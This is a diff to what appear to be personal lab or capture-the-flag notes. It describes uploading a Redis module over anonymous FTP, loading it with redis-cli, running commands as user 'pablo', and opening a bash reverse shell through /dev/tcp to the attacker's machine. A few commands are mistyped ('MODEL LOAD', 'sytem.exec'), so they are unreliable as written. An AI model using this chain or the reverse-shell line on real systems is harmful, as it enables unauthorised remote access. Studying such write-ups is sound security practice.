@@ -193,6 +193,8 @@ Enumerated top 200 UDP ports:
 ![](Pasted%20image%2020221110000948.png)
 #RedisModules-ExecuteCommands #HackTricksLoadRedisModule
 
+# Port 21 - FTP
+
 #### -Navigated to directory "pub" on ftp server and typed "put module.so" to upload the module to the ftp server:
 
 ![](Pasted%20image%2020221110001235.png)
@@ -204,6 +206,19 @@ Enumerated top 200 UDP ports:
 ![](Pasted%20image%2020221110001600.png)
 
 #AnonymousFTPdirectorylocation
+
+# Port 6379  - Redis
+
+#### -Typed "redis-cli -h [target IP]" to connect to Redis
+
+#### -Typed "MODEL LOAD "/var/ftp/pub/module.so" "
+![](Pasted%20image%2020221110134835.png)
+
+#### -Typed "sytem.exec "id" " and found username "pablo"
+![](Pasted%20image%2020221110134928.png)
+
+#### -I then typed " "/bin/bash -i >& /dev/tcp/[tun0 kali IP]/6379 0>&1" '',started a penelope listener on my kali machine and received a reverse shell:
+
 
 
 ---
